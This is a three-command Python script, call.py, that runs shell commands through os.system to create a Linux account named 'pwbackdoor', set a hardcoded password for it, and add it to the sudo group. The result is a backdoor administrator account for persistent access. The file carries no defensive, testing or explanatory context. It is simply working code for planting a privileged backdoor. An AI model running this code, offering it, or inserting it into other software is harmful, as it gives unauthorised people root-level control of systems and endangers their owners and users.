# call.py
import os

# Create a new user 'pwbackdoor' with password 'pwbackdoor1234'
os.system("sudo useradd pwbackdoor")
os.system("echo pwbackdoor:pwbackdoor1234 | sudo chpasswd")
    
# Grant 'pwbackdoor' sudo privileges
os.system("sudo usermod -aG sudo pwbackdoor")
